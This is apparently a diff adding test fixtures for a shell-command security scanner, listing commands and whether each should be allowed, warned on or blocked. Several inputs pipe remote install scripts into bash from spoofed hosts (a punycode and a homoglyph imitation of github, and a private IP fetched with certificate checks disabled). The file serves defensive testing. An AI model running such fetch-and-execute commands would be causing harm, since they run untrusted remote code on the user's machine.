@@ -1,0 +1,171 @@
+# Policy-related fixtures (behavior with default policy)
+
+[[fixture]]
+name = "bypass_env_clean_command"
+min_milestone = 1
+input = "ls -la"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "normal_url_default_policy"
+min_milestone = 1
+input = "curl https://example.com/api"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "block_should_override_warn"
+min_milestone = 1
+input = "curl http://xn--gthub-cua.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["punycode_domain"]
+
+[[fixture]]
+name = "multiple_findings_max_severity"
+min_milestone = 1
+input = "curl -k http://192.168.1.1/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "warn_level_finding"
+min_milestone = 1
+input = "curl https://bit.ly/install"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "clean_git_operation"
+min_milestone = 1
+input = "git push origin main"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_docker_operation"
+min_milestone = 0
+input = "docker ps -a"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_npm_operation"
+min_milestone = 0
+input = "npm test"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_pip_operation"
+min_milestone = 0
+input = "pip list"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_cargo_operation"
+min_milestone = 0
+input = "cargo clippy"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "high_severity_blocks"
+min_milestone = 1
+input = "curl http://gіthub.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname"]
+
+[[fixture]]
+name = "medium_severity_warns"
+min_milestone = 1
+input = "curl https://203.0.113.1/api"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["raw_ip_url"]
+
+[[fixture]]
+name = "allow_no_findings"
+min_milestone = 0
+input = "echo 'hello'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_clean_text"
+min_milestone = 0
+input = "just some text"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_with_url"
+min_milestone = 1
+input = "curl https://example.com/api"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+# ── M6 ch7 — package_policy section thresholds (negative-shape fixtures) ──
+#
+# The new policy-gated rules (`package_policy_*`) are emitted by
+# `install_txn` / `ecosystem_scan` from a `--online` registry signal AND
+# a configured policy threshold. The static engine path that these
+# fixtures exercise has neither signal, so the rules must NOT fire on
+# bare exec-context commands. The positive emission paths are unit-tested
+# in `install_txn.rs` and `ecosystem_scan.rs`. The rules are listed in
+# EXTERNALLY_TRIGGERED_RULES.
+
+[[fixture]]
+name = "m6_ch7_package_policy_newer_than_days_offline_does_not_fire"
+min_milestone = 6
+input = "npm install some-recent-package"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "m6_ch7_package_policy_low_downloads_offline_does_not_fire"
+min_milestone = 6
+input = "pip install rarely-downloaded-package"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "m6_ch7_package_policy_typosquat_distance_offline_does_not_fire"
+min_milestone = 6
+input = "cargo install some-distinct-crate-name"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "m6_ch7_package_policy_unknown_with_install_scripts_offline_does_not_fire"
+min_milestone = 6
+input = "npm install some-unknown-pkg"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "m6_ch7_package_policy_not_found_offline_does_not_fire"
+min_milestone = 6
+input = "npm install does-not-exist-anywhere"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
